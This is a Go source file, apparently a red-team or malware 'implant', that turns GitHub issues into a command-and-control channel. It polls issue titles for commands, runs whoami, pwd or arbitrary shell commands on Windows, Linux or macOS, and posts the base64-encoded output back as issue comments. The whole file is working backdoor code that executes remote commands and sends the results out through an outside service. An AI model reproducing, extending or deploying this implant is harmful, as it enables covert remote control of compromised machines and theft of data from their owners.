package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

type GitHubIssue struct {
	Title string `json:"title"`
}

// Issue 用于解析 GitHub API 返回的 issue 列表中的单个 issue 数据
type Issue struct {
	Number int `json:"number"` // Issue 编号
}

// 获取当前仓库的最晚 issue 编号，倒序
func GetOldestIssueNumber(token, owner, repo string) (int, error) {
	// 将 direction=desc 改为 direction=asc，以获取最早的 issue
	url := fmt.Sprintf("https://api.github.com/repos/%s/%s/issues?state=all&sort=created&direction=desc", owner, repo)

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return 0, fmt.Errorf("failed to create request: %v", err)
	}
	req.Header.Add("Authorization", "Bearer "+token)
	req.Header.Add("Accept", "application/vnd.github.v3+json")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return 0, fmt.Errorf("failed to get issues: %v", err)
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return 0, fmt.Errorf("failed to read response body: %v", err)
	}

	// 解析返回的 issue 列表
	var issues []Issue
	if err := json.Unmarshal(body, &issues); err != nil {
		return 0, fmt.Errorf("failed to parse JSON: %v", err)
	}

	// 检查是否有返回的 issue
	if len(issues) == 0 {
		//return 0, fmt.Errorf("no issues found")
		return 1, nil
	}

	// 返回最早创建的 issue 的编号
	return issues[0].Number + 1, nil
}

// 获取 GitHub issue 标题
func GetIssueTitle(token, owner, repo, issueNbrStr string) (string, error) {
	url := fmt.Sprintf("https://api.github.com/repos/%s/%s/issues/%s", owner, repo, issueNbrStr)

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return "", fmt.Errorf("Failed to create request: %v", err)
	}
	req.Header.Add("Authorization", "Bearer "+token)
	req.Header.Add("Accept", "application/vnd.github.v3+json")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("Failed to get issue title: %v", err)
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf("Failed to read response body: %v", err)
	}

	var issue GitHubIssue
	if err := json.Unmarshal(body, &issue); err != nil {
		return "", fmt.Errorf("Failed to parse JSON: %v", err)
	}

	return issue.Title, nil
}

// 提交 GitHub 评论
func PostComment(token, owner, repo, issueNbrStr, body string) error {
	url := fmt.Sprintf("https://api.github.com/repos/%s/%s/issues/%s/comments", owner, repo, issueNbrStr)
	commentBody := map[string]string{
		"body": body,
	}

	jsonBody, err := json.Marshal(commentBody)
	if err != nil {
		return fmt.Errorf("Failed to create JSON body: %v", err)
	}

	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonBody))
	if err != nil {
		return fmt.Errorf("Failed to create request: %v", err)
	}
	req.Header.Add("Authorization", "Bearer "+token)
	req.Header.Add("Content-Type", "application/json")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("Failed to post comment: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusCreated {
		return fmt.Errorf("Failed to post comment, status: %d", resp.StatusCode)
	}
	return nil
}

// base64 编码
func base64Encode(plain string) string {
	return base64.StdEncoding.EncodeToString([]byte(plain))
}

// base64 解码
func base64Decode(encoded string) (string, error) {
	decodedBytes, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return "", err
	}
	return string(decodedBytes), nil
}

// 获取当前工作目录
func pwd() string {
	dir, err := os.Getwd()
	if err != nil {
		return fmt.Sprintf("Failed in GetCurrentDirectory: %v", err)
	}
	return dir
}

// 获取计算机名称和用户名称
func getUID() string {
	//hostname, err := os.Hostname()
	//if err != nil {
	//	return fmt.Sprintf("Failed to get hostname: %v", err)
	//}
	var cmd *exec.Cmd
	switch runtime.GOOS {
	case "windows":
		// Windows 系统，使用 cmd.exe /C
		cmd = exec.Command("cmd.exe", "/C", "whoami")
	case "linux", "darwin":
		cmd = exec.Command("sh", "-c", "whoami")
	default:
		return "Unsupported OS"

	}
	username, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Failed to execute command: %v", err)
	}
	return string(username)
}

// 执行 shell 命令
func shell(command string) string {
	var cmd *exec.Cmd

	// 检查操作系统并选择对应的命令执行方式
	switch runtime.GOOS {
	case "windows":
		// Windows 系统，使用 cmd.exe /C
		cmd = exec.Command("cmd.exe", "/C", command)
	case "linux", "darwin": // darwin 是 macOS 的 GOOS 名
		// Linux 和 macOS 系统，使用 sh -c
		cmd = exec.Command("sh", "-c", command)
	default:
		return "Unsupported OS"
	}

	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Failed to execute command: %v", err)
	}
	return string(out)
}

func main() {
	if len(os.Args) < 4 {
		fmt.Println("Usage: implant <AccessToken> <Username> <Repository>")
		return
	}

	token := os.Args[1]
	owner := os.Args[2]
	repo := os.Args[3]
	issueNbr, err := GetOldestIssueNumber(token, owner, repo)
	if err != nil {
		fmt.Println(fmt.Errorf("Failed to get issue number: %v", err))
		return
	}
	fmt.Println(fmt.Sprintf("the final issue number is %d", issueNbr))

	for {
		issueNbrStr := fmt.Sprintf("%d", issueNbr)
		title, err := GetIssueTitle(token, owner, repo, issueNbrStr)
		if err != nil {
			//fmt.Println(fmt.Errorf("Failed to get issue title: %v", err))
			fmt.Println(fmt.Errorf("No command passed in: %v", err))
			return
		}

		if title == "" {
			fmt.Println("Waiting for the master to input command...")
			time.Sleep(2 * time.Second)
		}
		if title != "" {
			issueNbr++
			fmt.Println(fmt.Sprintf("Capture Input command: %s", title))
		}

		if title != "" && strings.HasPrefix(title, "pwd") {
			result := pwd()
			encoded := base64Encode(result)
			fmt.Printf("Encoded result: %s\n", encoded)
			if err := PostComment(token, owner, repo, issueNbrStr, encoded); err != nil {
				fmt.Println(fmt.Errorf("Failed to post comment: %v", err))
			}
		}

		if title != "" && strings.HasPrefix(title, "getuid") {
			result := getUID()
			encoded := base64Encode(result)
			fmt.Printf("Encoded result: %s\n", encoded)
			if err := PostComment(token, owner, repo, issueNbrStr, encoded); err != nil {
				fmt.Println(fmt.Errorf("Failed to post comment: %v", err))
			}
		}

		if title != "" && strings.HasPrefix(title, "cmd") {
			command := strings.TrimPrefix(title, "cmd ")
			result := shell(command)
			encoded := base64Encode(result)
			fmt.Printf("Encoded result: %s\n", encoded)
			if err := PostComment(token, owner, repo, issueNbrStr, encoded); err != nil {
				fmt.Println(fmt.Errorf("Failed to post comment: %v", err))
			}
		}

		if title != "" && strings.HasPrefix(title, "exit") {
			result := "Exited !!"
			encoded := base64Encode(result)
			fmt.Printf("Encoded result: %s\n", encoded)
			if err := PostComment(token, owner, repo, issueNbrStr, encoded); err != nil {
				fmt.Println(fmt.Errorf("Failed to post comment: %v", err))
			}
			return
		}
		time.Sleep(5 * time.Second)

	}
}
